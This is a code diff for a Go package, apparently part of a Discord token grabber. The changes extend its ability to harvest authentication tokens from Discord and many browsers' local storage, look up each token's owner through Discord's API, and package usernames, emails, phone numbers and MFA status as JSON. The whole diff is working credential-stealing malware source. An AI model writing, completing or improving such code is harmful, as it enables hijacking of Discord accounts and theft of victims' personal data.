@@ -2,6 +2,7 @@ package discord
 
 import (
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"os"
 	"regexp"
@@ -12,13 +13,33 @@ import (
 	"example.com/grabber/decryption"
 )
 
-var ids []int64
+//var ids []int64
 
 var baseurl string = "https://discord.com/api/v9/users/@me"
 
 var local string = os.Getenv("LOCALAPPDATA")
 var roaming string = os.Getenv("APPDATA")
-var temp string = os.Getenv("TEMP")
+
+//var temp string = os.Getenv("TEMP")
+
+type Response struct {
+	ID            string `json:"id"`
+	USERNAME      string `json:"username"`
+	DISCRIMINATOR string `json:"discriminator"`
+	EMAIL         string `json:"email"`
+	PHONE         string `json:"phone"`
+	MFA_ENABLED   bool   `json:"mfa_enabled"`
+}
+
+type Tokens struct {
+	TOKEN         string `json:"token"`
+	ID            string `json:"id"`
+	USERNAME      string `json:"username"`
+	DISCRIMINATOR string `json:"discriminator"`
+	EMAIL         string `json:"email"`
+	PHONE         string `json:"phone"`
+	MFA_ENABLED   bool   `json:"mfa_enabled"`
+}
 
 var token_paths = map[string]string{
 	"Discord":        roaming + "\\discord\\Local Storage\\leveldb\\",
@@ -40,15 +61,8 @@ var token_paths = map[string]string{
 	"CentBrowser":    local + "\\CentBrowser\\User Data\\Default\\Local Storage\\leveldb\\",
 }
 
-type Tokens struct {
-	Token    string `json:"token"`
-	ID       int64  `json:"id"`
-	Username string `json:"username"`
-	Email    string `json:"email"`
-	Password string `json:"password"`
-}
-
-func GetTokens() []string {
+func GetTokens() string {
+	var to_return []Tokens
 	var tokens_current []string
 	var final_tokens []string
 	for _, path := range token_paths {
@@ -112,11 +126,15 @@ func GetTokens() []string {
 	}
 	//remove duplicates
 	final_tokens = removeDuplicates(final_tokens)
+	for _, token := range final_tokens {
+		to_return = append(to_return, GetTokenInfo(token))
+	}
 
-	//convert final_tokens to json
-	info := GetTokenInfo(final_tokens[0])
-	fmt.Println(info)
-	return final_tokens
+	jsonData, err := json.MarshalIndent(to_return, "", "    ")
+	if err != nil {
+		return ""
+	}
+	return string(jsonData)
 }
 
 func removeDuplicates(elements []string) []string {
@@ -151,19 +169,39 @@ func CheckToken(token string) bool {
 }
 
 func GetTokenInfo(token string) Tokens {
+	client := http.Client{}
+
+	// Create a new request
 	req, err := http.NewRequest("GET", baseurl, nil)
 	if err != nil {
+		fmt.Println("Error creating request:", err)
 		return Tokens{}
 	}
+
+	// Set request headers
 	req.Header.Set("Authorization", token)
-	client := &http.Client{}
+
+	// Send the request
 	resp, err := client.Do(req)
 	if err != nil {
+		fmt.Println("Error sending request:", err)
 		return Tokens{}
 	}
-	if resp.StatusCode == 200 {
+	defer resp.Body.Close()
+
+	// Read the response body and assign it to they're respective variables
+	var response Response
+	err = json.NewDecoder(resp.Body).Decode(&response)
+	if err != nil {
+		fmt.Println("Error decoding response:", err)
 		return Tokens{}
 	}
-	fmt.Println(resp)
-	return Tokens{}
+
+	//username := (*mapped)["USERNAME"] + "#" + (*mapped)["DISCRIMINATOR"]
+	username := response.USERNAME + "#" + response.DISCRIMINATOR
+	user_id := response.ID
+	email := response.EMAIL
+	phone := response.PHONE
+	mfa := response.MFA_ENABLED
+	return Tokens{TOKEN: token, ID: user_id, USERNAME: username, EMAIL: email, PHONE: phone, MFA_ENABLED: mfa}
 }
